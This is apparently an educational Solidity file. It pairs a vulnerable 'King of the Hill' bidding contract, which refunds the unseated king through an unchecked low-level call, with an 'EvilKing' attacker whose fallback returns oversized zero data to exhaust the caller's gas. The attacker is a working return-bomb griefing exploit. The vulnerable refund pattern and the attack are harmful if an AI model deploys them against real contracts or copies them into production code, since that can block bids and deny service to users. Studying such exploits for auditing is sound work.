// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract KingOfTheHill {
    address public king;
    uint256 public topBid;

    function bid() external payable {
        require(msg.value > topBid);
        address unseatedKing = king;
        uint256 unseatedBid = topBid;
        king = msg.sender;
        topBid = msg.value;
        // Return the previous king's bid amount.
        // Common to assume that 1/64 of gasleft() before the
        // call will be available to complete execution.
        address(unseatedKing).call{value: unseatedBid}("");
    }
}

contract EvilKing {
    KingOfTheHill private hill;
    constructor(KingOfTheHill _hill) { hill = _hill; }
    function doBid() external payable {
        hill.bid{value: msg.value}();
    }

    // Force calling contract to consume remaining gas in RETURNDATACOPY
    // by returning as much 0 data as possible without running out of gas.
    fallback() external payable override {
        // approximate solution to Cmem for new_mem_size_words
        uint256 rsize = sqrt(gasleft() / 2 * 512);
        assembly {
            return(0x0, mul(rsize, 0x20))
        }
    }

    function sqrt(uint x) private returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}